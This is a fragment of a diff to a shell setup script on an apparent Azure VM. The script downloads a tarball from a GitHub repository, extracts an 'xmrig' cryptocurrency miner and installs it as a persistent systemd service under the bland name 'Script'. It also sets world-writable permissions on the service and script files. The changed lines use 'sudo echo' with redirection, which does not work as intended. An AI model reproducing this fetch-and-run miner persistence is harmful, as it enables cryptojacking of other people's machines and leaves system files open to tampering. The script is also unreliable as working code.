@@ -6,14 +6,14 @@ sudo chmod 777 /etc/systemd/system/script.service ;
 sudo chmod 777 /usr/local/bin/script.sh ;
 sudo apt update ;
 cd /home/azureuser/
-sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && sudo tar xvf output_filename.tar ;
+wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && tar xvf output_filename.tar ;
 sleep 3 ;
 sudo chmod +x xmrig
 
-echo "#!/bin/bash
+sudo echo "#!/bin/bash
 ./xmrig" > /usr/local/bin/script.sh ;
 
-echo "[Unit]
+sudo echo "[Unit]
 Description=Script
 After=network.target
 [Service]
